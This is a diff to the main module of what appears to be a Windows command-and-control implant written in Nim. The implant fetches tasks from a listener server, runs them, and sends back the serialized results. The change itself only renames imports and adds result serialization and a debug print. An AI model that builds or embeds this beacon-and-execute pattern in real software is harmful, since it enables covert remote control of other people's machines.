@@ -1,8 +1,9 @@
 import strformat, os, times
 import winim
 
-import ./[types, http]
-import task/handler, task/parser
+import ./[agentTypes, http]
+import task/handler, task/packer
+import ../../common/types
 
 const ListenerUuid {.strdefine.}: string = ""
 const Octet1 {.intdefine.}: int = 0
@@ -73,8 +74,13 @@ proc main() =
 
         # Execute all retrieved tasks and return their output to the server
         for task in tasks: 
-            let result: TaskResult = config.handleTask(task)
-            discard config.postResults(agent, result)
+            let 
+                result: TaskResult = config.handleTask(task)
+                resultData: seq[byte] = serializeTaskResult(result)
+
+            echo resultData
+
+            discard config.postResults(result, resultData)
             
 when isMainModule: 
     main() 
